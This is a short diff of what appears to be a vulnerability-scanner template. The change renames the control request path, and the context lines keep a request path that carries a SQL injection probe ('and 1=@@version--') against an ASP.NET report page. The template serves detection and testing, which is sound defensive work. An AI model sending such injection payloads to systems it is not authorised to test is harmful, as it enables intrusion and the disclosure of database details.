@@ -18,7 +18,7 @@ request:
   path: "/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+"
 control:
   method: "GET"
-  path: "/.guardian-none-{{rand}}"
+  path: "/.kovo-none-{{rand}}"
 matchers-condition: "or"
 matchers:
   - type: "word"
